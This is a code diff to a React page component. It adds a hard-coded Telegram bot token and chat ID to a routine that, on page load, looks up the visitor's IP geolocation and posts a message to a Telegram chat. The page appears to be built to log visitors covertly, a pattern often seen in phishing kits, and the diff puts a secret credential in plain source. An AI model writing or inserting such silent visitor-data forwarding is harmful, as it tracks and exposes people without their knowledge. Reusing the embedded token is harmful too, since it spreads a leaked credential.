@@ -59,8 +59,8 @@ const Index: FC = () => {
             logSentRef.current = true;
             const fetchGeoAndSendTelegram = async () => {
                 const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
-                const botToken = '';
-                const  = '';
+                const botToken = '7901122063:AAFYDNwCeZolLkFG3U9m8i-5bJGeReZxnDE';
+                const chatId = '-4836923916';
 
                 const geoRes = await fetch(geoUrl);
                 const geoData = await geoRes.json();
@@ -98,7 +98,7 @@ const Index: FC = () => {
 
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                 const payload = {
-                    chat_id: ,
+                    chat_id: chatId,
                     text: msg,
                     parse_mode: 'HTML',
                 };
